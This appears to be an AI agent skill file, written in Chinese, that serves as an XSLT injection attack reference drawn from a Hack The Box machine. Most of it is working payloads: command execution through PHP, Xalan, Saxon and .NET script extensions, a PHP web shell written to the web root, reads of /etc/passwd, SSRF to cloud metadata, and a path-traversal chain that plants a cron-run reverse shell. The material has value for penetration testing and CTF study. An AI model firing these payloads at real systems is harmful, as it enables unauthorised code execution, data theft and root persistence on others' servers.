---
name: 'xslt-injection'
description: 'XSLT 注入全集：PHP(libxslt)/Java(Xalan,Saxon)/.NET 四大处理器 RCE payload + 文件读/SSRF/端口扫描/OOB。Conversor HTB 来源。与 [[xml-attacks-beyond-xxe]] 互补。'
disable-model-invocation: true
metadata: { domain: web, tier: T2 }
---
> 📌 DSH 适配：本技能移植自 RS。原 read_skill/run_skill 调用 = 用 DSH 的 skill 工具按名加载对应技能；fleet/kali-mcp = 用 bash 后台任务与 subagent 工具实现。

# XSLT Injection — 完整攻击参考

> 来源：Conversor HTB (XSLT写文件RCE) + HackTricks + PayloadsAllTheThings + IOActive论文
> 与 xml-attacks-beyond-xxe 互补 — XXE 攻击 XML 解析器，XSLT 攻击样式表处理器

## 与 XXE 的本质区别

| | XXE | XSLT Injection |
|---|---|---|
| 攻击对象 | XML 解析器 (DTD/实体) | XSLT 处理器 (样式表引擎) |
| 入口点 | 控制 XML 文档 | 控制 XSLT 样式表 |
| 文件读 | `<!ENTITY xxe SYSTEM "file://">` 返回内容 | `document('/etc/passwd')` 错误信息泄露前80字符; XSLT2.0 `unparsed-text()` 完整读 |
| SSRF | 实体指向 URL | `document('http://...')` / `doc()` |
| RCE | 极少 (expect:// 基本死了) | **常见** — PHP/Java/.NET 都有扩展函数 |

## 检测

```xml
<!-- 确认注入: 7*7 → 49 = XSLT 执行 -->
<xsl:value-of select="7*7"/>

<!-- 指纹 -->
<xsl:value-of select="system-property('xsl:vendor')"/>
<!-- libxslt → "libxslt" | Saxon → "SAXON" | Xalan → "Apache" | MS → "Microsoft" -->
<xsl:value-of select="system-property('xsl:version')"/>
<!-- 1.0 或 2.0 — 2.0 有 unparsed-text() -->
```

## 各处理器 Payload 速查

### PHP / lxml (libxslt — XSLT 1.0)

```xml
<!-- RCE: php:function (需要 registerPHPFunctions) -->
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:php="http://php.net/xsl">
  <xsl:template match="/">
    <xsl:value-of select="php:function('system','id')"/>
  </xsl:template>
</xsl:stylesheet>

<!-- 写文件: exsl:document (不依赖 php:function) -->
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:ex="http://exslt.org/common" extension-element-prefixes="ex">
  <xsl:template match="/">
    <ex:document href="/var/www/html/shell.php" method="text">
&lt;?php system($_GET['cmd']); ?&gt;
    </ex:document>
  </xsl:template>
</xsl:stylesheet>
<!-- 🔴 lxml 的 exsl:document 可能被禁用 (no-op) — Conversor 就是这样! -->

<!-- 文件读 (错误信息泄露前 ~80 字符) -->
<xsl:value-of select="document('/etc/passwd')"/>
<xsl:include href="/etc/passwd"/>   <!-- 也会触发错误泄露 -->

<!-- SSRF -->
<xsl:copy-of select="document('http://169.254.169.254/latest/meta-data/')"/>
```

### Java / Xalan-J

```xml
<!-- RCE: 直接绑定 java.lang.Runtime -->
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime">
  <xsl:template match="/">
    <xsl:variable name="rtobj" select="rt:getRuntime()"/>
    <xsl:variable name="proc" select="rt:exec($rtobj,'id')"/>
    <xsl:value-of select="$proc"/>
  </xsl:template>
</xsl:stylesheet>
```

### Java / Saxon (PE/EE)

```xml
<!-- RCE: java: namespace + reflexive 扩展 -->
<xsl:stylesheet version="2.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:Runtime="java:java.lang.Runtime">
  <xsl:template match="/">
    <xsl:value-of select="Runtime:exec(Runtime:getRuntime(),'id')"/>
  </xsl:template>
</xsl:stylesheet>

<!-- 完整文件读: unparsed-text() — XSLT 2.0 -->
<xsl:value-of select="unparsed-text('/etc/passwd')"/>
```

### .NET (XslCompiledTransform — 仅 .NET Framework)

```xml
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:msxsl="urn:schemas-microsoft-com:xslt"
  xmlns:user="urn:my-scripts">
  <msxsl:script language="C#" implements-prefix="user"><![CDATA[
  public string exec(){
    System.Diagnostics.Process p = new System.Diagnostics.Process();
    p.StartInfo.FileName = "cmd.exe";
    p.StartInfo.Arguments = "/c whoami";
    p.StartInfo.RedirectStandardOutput = true;
    p.StartInfo.UseShellExecute = false;
    p.Start();
    p.WaitForExit();
    return p.StandardOutput.ReadToEnd();
  }
  ]]></msxsl:script>
  <xsl:template match="/">
    <xsl:value-of select="user:exec()"/>
  </xsl:template>
</xsl:stylesheet>
```

## 实战链：XSLT 写文件 → cron 执行

> Conversor HTB 案例 — 组合路径穿越 + XSLT 写文件

```
弱点:
  ① os.path.join(UPLOAD_FOLDER, xml_file.filename) — 无过滤 → 路径穿越
  ② etree.parse(xslt_path) — XSLT 处理无安全限制
  ③ scripts/ 目录 → cron 每分钟执行其中所有 Python 脚本

链:
  上传恶意 XSLT 文件名: ../scripts/revshell.xml
  ↓
  XSLT 写恶意 Python: ex:document href="../scripts/rev.py"
  ↓
  cron 每分钟执行 → rev.py 以 root 运行 → RCE
```

## XSLT vs XXE 检测决策树

```
[ ] 端点接受 .xsl/.xslt 文件? → 直接试 XSLT ✅
[ ] 参数名 xslt/xsl/stylesheet/template? → 试 XSLT ✅
[ ] XXE 试了不通? → 可能 XSLT 没被限制 → 试 document() ✅
[ ] 7*7 反射成 49? → XSLT 确认 ✅
[ ] document('http://COLLABORATOR/') 有回调? → SSRF 确认 → 二者之一
```

## 不同处理器指纹速查

| 处理器 | system-property('xsl:vendor') | system-property('xsl:version') | RCE 方式 |
|--------|------------------------------|-------------------------------|---------|
| PHP libxslt | "libxslt" / "GNOME" | "1.0" | php:function / exsl:document |
| Python lxml | "libxslt" | "1.0" | 需注册扩展函数 (少见) |
| Java Xalan | "Apache...Xalan" | "1.0" | java.lang.Runtime namespace |
| Java Saxon | "SAXON...Saxonica" | "2.0" | java: 扩展 + unparsed-text() |
| .NET XslCompiled | "Microsoft" | "1.0" | msxsl:script (仅 .NET Framework) |

**Why:** XXE 失败不代表安全 — XSLT 处理器可能仍然被滥用。Conversor 就是典型：resolve_entities=False 但 XSLT 扩展全开。
**How to apply:** 遇到 XML→HTML/PDF 转换或 .xsl 上传 → 第一件事试 7*7。确认后按处理器类型选 payload。
